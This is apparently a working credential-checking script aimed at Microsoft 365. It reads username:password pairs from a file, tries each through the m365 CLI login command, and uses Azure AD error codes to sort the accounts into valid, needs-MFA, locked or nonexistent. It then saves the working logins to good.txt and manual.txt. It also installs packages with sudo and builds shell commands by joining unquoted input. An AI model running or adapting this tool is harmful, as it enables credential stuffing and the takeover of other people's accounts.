# -*- coding: UTF-8 -*-
import os
import platform
import subprocess
import datetime
import numpy as np
import pandas as pd
import threading

######  acc  part
accs = np.array(pd.read_table("./acc.txt", dtype=str, sep=':', usecols=(0, 1), encoding='utf-8', skip_blank_lines=True, header=None))


sem_num = 10
sem = threading.Semaphore(sem_num)

def run():
    if test_m365() == 'true':
        print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' 开始运行')
        with sem:
            for acc in accs:
                try:
                    if get_status(acc) == '密码正确':
                        print(acc[0] + ':' + acc[1] + ' good')
                        good = acc[0] + ':' + acc[1]
                        with open('./good.txt', 'a', encoding='utf-8') as fa:
                            fa.write(good)
                            fa.write('\n')
                    elif get_status(acc) == '需要添加二验':
                        print(acc[0] + ':' + acc[1] + ' manual')
                        manual = acc[0] + ':' + acc[1]
                        with open('./manual.txt', 'a', encoding='utf-8') as fa:
                            fa.write(manual)
                            fa.write('\n')
                    else:
                        print(acc[0] + ':' + acc[1] + ' bad')
                except Exception as e:
                    pass
        print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' 完成运行')
    else:
        print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' 运行结束')


def get_status(acc):
    shell_content = 'm365 login  --authType password --userName ' + acc[0] + ' --password ' + acc[1]
    status = subprocess.getoutput(shell_content)
    # print(status)
    if '65001' in str(status):
        return '密码正确'
    elif '50034' in str(status):
        return '账户不存在'
    elif '50126' in str(status):
        return '密码错误'
    elif '53003' in str(status):
        return 'IP限制'
    elif '50057' in str(status):
        return '管理ban'
    elif '50059' in str(status):
        return '被删号'
    elif '50053' in str(status):
        return '被暴力破解，自动ban'
    elif '90019' in str(status):
        return '账号错误'
    elif '50076' in str(status):
        return '需要二验'
    elif '50079' in str(status):
        return '需要添加二验'
    else:
        print(status)
        return '未知错误'


def test_npm():
    try:
        npm_ver = subprocess.check_output('npm -v', shell=True)
    except Exception as e:
        npm_ver = '0'

    if eval(npm_ver[0:1]) >= 6:
        print('当前npm版本为' + str(npm_ver) + '将继续运行')
        return 'true'
    else:
        print('npm未安装或版本过低，尝试自动安装...')
        sys_ver = platform.uname()
        if 'Debian' in sys_ver or 'Ubuntu' in sys_ver:
            os.system('sudo apt-get update')
            os.system('sudo apt-get upgrade')
            os.system('sudo apt install npm')
            os.system('sudo npm install npm -g')
            os.system('sudo npm cache clean')
            os.system('npm install -g n')
            os.system('sudo n stable')
        elif 'Centos' in sys_ver or 'Redhat' in sys_ver or 'Fedora' in str(sys_ver):
            os.system('sudo yum -y upgrade')
            os.system('sudo yum install npm')
            os.system('sudo npm install npm -g')
            os.system('sudo npm cache clean')
            os.system('npm install -g n')
            os.system('sudo n stable')
        else:
            print('系统为Windows或其他系统，请手动安装nodejs与npm')
            return 'false'
    try:
        npm_ver = subprocess.check_output('npm -v', shell=True)
    except Exception as e:
        npm_ver = '0'

    if eval(npm_ver[0:1]) >= 6:
        print('当前npm版本为' + npm_ver + '将继续运行')
        return 'true'
    else:
        print('npm自动安装/更新失败，请手动安装')


def test_m365():
    if test_npm() == 'true':
        try:
            m365_ver = subprocess.check_output('m365 version', shell=True)
        except Exception as e:
            m365_ver = '0'
        if m365_ver == '0':
            print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' 开始安装m365')
            os.system('npm install -g @pnp/cli-microsoft365')
        elif 'v' in str(m365_ver):
            print('m365环境正常')
            return 'true'
        else:
            print('未知错误，请尝试手动安装m365')
            return 'false'
    else:
        print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' m365安装跳过')
        return 'false'
    try:
        m365_ver = subprocess.check_output('m365 version', shell=True)
    except Exception as e:
        m365_ver = '0'
    if 'v' in str(m365_ver):
        print('m365环境正常')
        return 'true'
    else:
        print('未知错误，请尝试手动安装m365')
        return 'false'

run()
